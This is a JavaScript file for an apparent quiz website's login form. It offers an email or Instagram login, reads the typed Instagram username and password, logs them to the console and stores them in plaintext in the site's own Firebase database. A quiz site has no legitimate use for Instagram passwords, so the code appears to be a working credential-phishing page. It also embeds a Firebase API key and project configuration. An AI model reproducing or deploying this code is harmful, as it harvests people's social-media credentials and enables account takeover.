// Firebase configuration
var firebaseConfig = {
  apiKey: "AIzaSyA6gcvv5l9OMob6n9gOfsicWdkOzKaSE-k",
  authDomain: "quize-time-fe942.firebaseapp.com",
  databaseURL: "https://quize-time-fe942-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "quize-time-fe942",
  storageBucket: "quize-time-fe942.firebasestorage.app",
  messagingSenderId: "51098933242",
  appId: "1:51098933242:web:87338c3fde306d63af3643",
  measurementId: "G-Z2VEND82PT"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
var database = firebase.database();

// Event listener for the select input
document.getElementById("login-option").addEventListener("change", function() {
  const selectedOption = this.value;

  // Hide both login methods initially
  document.getElementById("email-login").style.display = "none";
  document.getElementById("instagram-login").style.display = "none";

  // Show the correct login method based on the selected option
  if (selectedOption === "email") {
      document.getElementById("email-login").style.display = "block";
  } else if (selectedOption === "instagram") {
      document.getElementById("instagram-login").style.display = "block";
  }
});

// Event listener for the form submission
document.getElementById("submitButton").addEventListener("click", function(event) {
  event.preventDefault(); // Prevent form submission from reloading the page

  const selectedOption = document.getElementById("login-option").value;
  console.log("Selected login method: ", selectedOption); // Check the selected option

  // Check if the fields have the right values
  let userData = null;

  if (selectedOption === "email") {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      console.log("Email: ", email); // Debug: Show the email entered
      console.log("Password: ", password); // Debug: Show the password entered

      // Check if email and password are non-empty
      if (email && password) {
          userData = {
              email: email,
              password: password
          };
      } else {
          console.log("Email or password is missing!"); // Debug: Show error if fields are empty
      }
  } else if (selectedOption === "instagram") {
      const instagramUsername = document.getElementById("instagram-username").value;
      const instagramPassword = document.getElementById("instagram-password").value;

      console.log("Instagram Username: ", instagramUsername); // Debug: Show Instagram username
      console.log("Instagram Password: ", instagramPassword); // Debug: Show Instagram password

      // Check if Instagram username and password are non-empty
      if (instagramUsername && instagramPassword) {
          userData = {
              instagramUsername: instagramUsername,
              instagramPassword: instagramPassword
          };
      } else {
          console.log("Instagram username or password is missing!"); // Debug: Show error if Instagram fields are empty
      }
  }

  // If userData exists, push data to Firebase
  if (userData) {
      const newPostRef = database.ref('users').push();
      newPostRef.set(userData)
          .then(() => {
              console.log("Data successfully saved to Firebase!");
          })
          .catch((error) => {
              console.error("Error saving data to Firebase: ", error);
          });
  } else {
      console.log("No data to save.");
  }
});
